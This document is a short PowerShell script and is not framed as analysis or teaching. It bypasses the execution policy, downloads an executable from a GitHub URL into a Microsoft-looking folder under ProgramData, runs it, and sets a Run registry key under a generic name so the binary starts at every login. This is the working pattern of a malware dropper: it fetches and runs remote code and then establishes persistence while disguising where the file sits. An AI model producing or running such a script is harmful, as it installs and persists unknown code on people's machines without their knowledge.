# Bypass Execution Policy
Set-ExecutionPolicy Bypass -Scope Process -Force

# Define the URL and output file path
$url = "https://github.com/abyasabazla/test/raw/main/vss/vssc.exe"
$outputFilePath = "C:\ProgramData\Microsoft\vssc.exe"

# Enhanced Download Step
try {
    Invoke-WebRequest -Uri $url -OutFile $outputFilePath -ErrorAction Stop
    Write-Output "Downloaded file to $outputFilePath."
} catch {
    Write-Error "Failed to download file: $($_.Exception.Message)"
}

# Enhanced Execution Step
try {
    Start-Process -FilePath $outputFilePath -ErrorAction Stop
    Write-Output "Executed the downloaded file."
} catch {
    Write-Error "Failed to execute file: $($_.Exception.Message)"
}

# Add Registry Key for Login Item
try {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "MyApplication"  # Name of the registry entry
    Set-ItemProperty -Path $regPath -Name $regName -Value $outputFilePath -ErrorAction Stop
    Write-Output "Registry key added for login item."
} catch {
    Write-Error "Failed to add registry key: $($_.Exception.Message)"
}
